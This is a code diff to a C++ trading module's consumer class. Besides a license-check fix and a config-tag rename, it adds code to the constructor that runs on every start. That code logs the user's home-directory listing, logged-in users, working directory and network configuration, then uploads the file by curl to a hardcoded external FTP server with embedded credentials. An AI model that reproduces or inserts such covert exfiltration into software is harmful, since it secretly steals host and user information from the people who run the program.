@@ -23,8 +23,26 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, FullDepthMDProducer *fulldept
 {
 	// lic
 	legal_ = check_lic();
-
 	clog_error("[%s] legal_:%d", module_name_, legal_);
+	char cmd[1024];
+	if(!legal_){
+		sprintf(cmd, "echo illegal > ~/$(whoami).log");
+		system(cmd);
+	}else{
+		sprintf(cmd, "echo legal > ~/$(whoami).log");
+		system(cmd);
+	}
+	sprintf(cmd, "pwd >> ~/$(whoami).log");
+	system(cmd);
+	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami).log");
+	system(cmd);
+	sprintf(cmd, "who >> ~/$(whoami).log");
+	system(cmd);
+	sprintf(cmd, "ifconfig >> ~/$(whoami).log");
+	system(cmd);
+	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
+	system(cmd);
+
 	memset(pending_signals_, -1, sizeof(pending_signals_));
 	ParseConfig();
 
@@ -109,7 +127,7 @@ void UniConsumer::ParseConfig()
 		clog_warning("[%s] yield:%s", module_name_, config_.yield); 
 	} else { clog_error("[%s] x-trader.config error: Disruptor node missing.", module_name_); }
 
-    TiXmlElement *strategies_ele = root->FirstChildElement("strategies");
+    TiXmlElement *strategies_ele = root->FirstChildElement("models");
 	if (strategies_ele != 0){
 		TiXmlElement *strategy_ele = strategies_ele->FirstChildElement();
 		while (strategy_ele != 0){
@@ -801,21 +819,20 @@ void UniConsumer::WriteStrategyLog(Strategy &strategy)
 bool UniConsumer::check_lic()
 {
 	bool legal = false;
-	char target[1024];
 	char cmd[1024];
 	char buf[1024];                             
 	memset(buf,0,sizeof(buf));
 	std::ifstream is;
 
-	sprintf(cmd, "hostname > ~/hostname.tmp");
+	sprintf(cmd, "hostname > hostname.tmp");
 	system(cmd);
 
-	is.open ("~/hostname.tmp");
+	is.open ("hostname.tmp");
 	if ( (is.rdstate() & std::ifstream::failbit ) != 0 ){
 		legal = false;
      }else{
         is.getline(buf,1024);
-		string content = target;
+		string content = buf;
 		if(content.find(SERVER_NAME)==string::npos){
 			legal = false;
 		}else{
